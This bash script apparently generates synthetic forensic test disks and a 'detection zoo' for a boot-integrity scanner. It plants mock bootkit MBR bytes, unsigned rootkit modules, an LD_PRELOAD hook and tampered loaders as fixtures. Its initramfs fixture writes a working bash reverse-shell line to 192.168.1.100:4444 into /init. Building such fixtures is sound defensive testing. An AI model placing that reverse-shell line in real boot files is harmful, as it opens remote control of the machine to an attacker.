#!/usr/bin/env bash
# ==============================================================================
# Booto Synthetic Forensic Test Disk Generator
#   gen_mock_disk.sh [image]            one disk image plus a staged tree of planted samples
#   gen_mock_disk.sh --zoo <dir> <mkpe> the detection zoo: one case per folder under <dir>
# Every sample is a harmless look-alike (the bytes or layout a rule matches), never live malware.
# ==============================================================================
set -euo pipefail

for tool in python3 dd cpio find; do
    command -v "${tool}" >/dev/null || { echo "[-] Error: required tool '${tool}' not found in PATH." >&2; exit 1; }
done

KVER=6.5.0-generic

# plant_mbr <image> [rovnix]: 512-byte MBR with one Linux partition; "rovnix" adds the bootkit's hook bytes.
plant_mbr() {
    python3 - "$1" "${2:-}" <<'PY'
import sys
mbr = bytearray(512)
if sys.argv[2] == 'rovnix':
    hook = b'\xfa\x33\xc0\x8e\xd0\x8e\xd8\x8e\xc0\xbc\x00\x7c\xcd\x13'
    mbr[0:len(hook)] = hook
mbr[446] = 0x80                                   # active
mbr[450] = 0x83                                   # Linux
mbr[454:458] = (2048).to_bytes(4, 'little')       # first LBA
mbr[458:462] = (8192).to_bytes(4, 'little')       # sector count
mbr[510:512] = b'\x55\xaa'
with open(sys.argv[1], 'r+b') as f:
    f.write(mbr)
PY
}

# plant_initramfs <root> [revshell]: newc cpio at boot/initrd.img-$KVER; "revshell" adds a reverse shell to /init.
plant_initramfs() {
    local stage
    stage="$(mktemp -d)"
    {
        echo '#!/bin/sh'
        echo 'echo "Booting early userland..."'
        [ "${2:-}" = revshell ] && echo '/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
        echo 'exec /sbin/init'
    } > "${stage}/init"
    chmod +x "${stage}/init"
    mkdir -p "$1/boot"
    (cd "${stage}" && find . | cpio -o -H newc --quiet) > "$1/boot/initrd.img-${KVER}"
    rm -rf "${stage}"
}

plant_preload() {
    mkdir -p "$1/etc" "$1/lib/x86_64-linux-gnu"
    echo "/lib/x86_64-linux-gnu/libazazel.so" > "$1/etc/ld.so.preload"
    echo "ELF MOCK LIB AZAZEL" > "$1/lib/x86_64-linux-gnu/libazazel.so"
}

# ------------------------------------------------------------------------------
# Zoo mode
# ------------------------------------------------------------------------------

# module <root> <name> [unsigned|fake]: a real ELF object. Signed ones end as scripts/sign-file leaves them:
# a DER blob, the module_signature struct, the marker. "fake" has the marker only.
module() {
    local ko="$1/lib/modules/${KVER}/kernel/drivers/char/$2.ko"
    mkdir -p "$(dirname "${ko}")"
    echo "int $2_init(void) { return 0; }" | "${CC:-cc}" -x c -c - -o "${ko}"
    case "${3:-}" in
        unsigned) return ;;
        fake) ;;
        *)  printf '\060\202\001\050' >> "${ko}"                                   # SEQUENCE, 296 bytes
            head -c 296 /dev/zero >> "${ko}"
            printf '\000\000\002\000\000\000\000\000\000\000\001\054' >> "${ko}" ;; # id_type PKCS#7, sig_len 300
    esac
    printf '~Module signature appended~\n' >> "${ko}"
}

pe() { "${MKPE}" "$@" >/dev/null 2>&1; }

# pkg_db <root> dpkg|pacman|rpm: a package database that lists usr/bin/ls with its true digest.
pkg_db() {
    mkdir -p "$1/usr/bin"
    echo "ls binary" > "$1/usr/bin/ls"
    python3 - "$1" "$2" <<'PY'
import gzip, hashlib, os, sqlite3, struct, sys
root, kind = sys.argv[1], sys.argv[2]
data = open(root + '/usr/bin/ls', 'rb').read()
sha = hashlib.sha256(data).hexdigest()
def put(rel, content):
    path = os.path.join(root, rel)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    open(path, 'wb').write(content)
if kind == 'dpkg':
    put('var/lib/dpkg/info/coreutils.md5sums', ('%s  usr/bin/ls\n' % hashlib.md5(data).hexdigest()).encode())
elif kind == 'pacman':
    put('var/lib/pacman/local/coreutils-9.4-1/mtree',
        gzip.compress(('#mtree\n/set type=file uid=0 gid=0 mode=644\n./usr/bin/ls sha256digest=%s\n' % sha).encode()))
else:
    # rpm header blob: il, dl, il index entries of (tag, type, offset, count), then the data store
    tags = [(1000, 6, 1, b'coreutils\0'),              # NAME
            (1035, 8, 1, sha.encode() + b'\0'),        # FILEDIGESTS
            (1116, 4, 1, struct.pack('>I', 0)),        # DIRINDEXES
            (1117, 8, 1, b'ls\0'),                     # BASENAMES
            (1118, 8, 1, b'/usr/bin/\0'),              # DIRNAMES
            (5011, 4, 1, struct.pack('>I', 8))]        # FILEDIGESTALGO = SHA-256
    index, store = b'', b''
    for tag, typ, count, payload in tags:
        index += struct.pack('>IIII', tag, typ, len(store), count)
        store += payload
    put('usr/lib/sysimage/rpm/rpmdb.sqlite', b'')
    os.remove(root + '/usr/lib/sysimage/rpm/rpmdb.sqlite')
    db = sqlite3.connect(root + '/usr/lib/sysimage/rpm/rpmdb.sqlite')
    db.execute('CREATE TABLE Packages (hnum INTEGER PRIMARY KEY AUTOINCREMENT, blob BLOB NOT NULL)')
    db.execute('INSERT INTO Packages (blob) VALUES (?)', (struct.pack('>II', len(tags), len(store)) + index + store,))
    db.commit()
PY
}

# new_case <name> <expected engine|clean> [dpkg|pacman|rpm]: a clean Linux install every planted case starts from.
new_case() {
    CASE="${ZOO}/$1"
    ROOT="${CASE}/root"
    mkdir -p "${ROOT}/boot/efi/EFI/BOOT"
    echo "$2" > "${CASE}/expect"
    dd if=/dev/zero of="${CASE}/disk.img" bs=1M count=0 seek=5 status=none   # sparse; holds the partition's VBR
    plant_mbr "${CASE}/disk.img"
    [ "${3:-}" = none ] && return
    pe signed "${ROOT}/boot/efi/EFI/BOOT/BOOTX64.EFI"
    module "${ROOT}" e1000
    module "${ROOT}" loop
    plant_initramfs "${ROOT}"
    pkg_db "${ROOT}" "${3:-dpkg}"
}

build_zoo() {
    ZOO="$1"
    MKPE="$2"
    rm -rf "${ZOO}"

    new_case clean-debian clean dpkg
    new_case clean-arch   clean pacman
    new_case clean-fedora clean rpm

    new_case mbr-rovnix "MBR/VBR"
    plant_mbr "${CASE}/disk.img" rovnix

    new_case esp-tampered-loader "UEFI ESP"
    pe tampered "${ROOT}/boot/efi/EFI/BOOT/BOOTX64.EFI"

    new_case lkm-unsigned "Kernel LKM"
    module "${ROOT}" rootkit unsigned

    new_case lkm-fake-signature "Kernel LKM"
    module "${ROOT}" rootkit fake

    new_case initramfs-revshell "Initramfs"
    plant_initramfs "${ROOT}" revshell

    new_case preload-hook "LD_PRELOAD"
    plant_preload "${ROOT}"

    new_case pkg-changed-binary "Packages"
    echo "trojaned ls" > "${ROOT}/usr/bin/ls"

    new_case win-patched-winload "Windows boot" none
    mkdir -p "${ROOT}/Windows/System32"
    pe signed "${ROOT}/Windows/System32/ntoskrnl.exe"
    pe tampered "${ROOT}/Windows/System32/winload.efi"
}

if [ "${1:-}" = "--zoo" ]; then
    [ $# -eq 3 ] || { echo "usage: $0 --zoo <dir> <mkpe>" >&2; exit 1; }
    build_zoo "$2" "$3"
    exit 0
fi

# ------------------------------------------------------------------------------
# Image mode
# ------------------------------------------------------------------------------
OUTPUT_IMG="${1:-/tmp/booto_mock_disk.img}"
IMG_SIZE_MB=64

STAGING_DIR="/tmp/booto_mock_staging_$$"
on_exit() {
    rc=$?
    if [ "${rc}" -ne 0 ]; then
        echo "[-] Error: mock disk generation failed; removing partial ${OUTPUT_IMG}" >&2
        rm -f "${OUTPUT_IMG}"
        rm -rf "${STAGING_DIR}"
    fi
}
trap on_exit EXIT

echo "=== Generating Booto Synthetic Forensic Disk: ${OUTPUT_IMG} ==="
dd if=/dev/zero of="${OUTPUT_IMG}" bs=1M count="${IMG_SIZE_MB}" status=none

rm -rf "${STAGING_DIR}"
mkdir -p "${STAGING_DIR}/boot/efi/EFI/BOOT" \
         "${STAGING_DIR}/lib/modules/${KVER}/kernel/drivers/char"

echo "[+] Generating synthetic UEFI ESP bootloader with revoked DBX signature..."
printf '\x4D\x5A%*s\x50\x45\x00\x00\x64\x86\x02\x00' 128 "" > "${STAGING_DIR}/boot/efi/EFI/BOOT/BOOTX64.EFI"

echo "[+] Generating synthetic Diamorphine LKM rootkit..."
echo "diamorphine rootkit mock module sys_call_table hook module_hidden" \
    > "${STAGING_DIR}/lib/modules/${KVER}/kernel/drivers/char/diamorphine.ko"

echo "[+] Generating synthetic /etc/ld.so.preload Azazel hook..."
plant_preload "${STAGING_DIR}"

echo "[+] Generating synthetic Initramfs CPIO archive with reverse shell payload..."
plant_initramfs "${STAGING_DIR}" revshell

echo "[+] Injecting synthetic Rovnix MBR Bootkit into Sector 0 of disk image..."
plant_mbr "${OUTPUT_IMG}" rovnix

echo "[+] Staging complete at ${STAGING_DIR}"
echo "=== Synthetic disk artifacts created successfully ==="
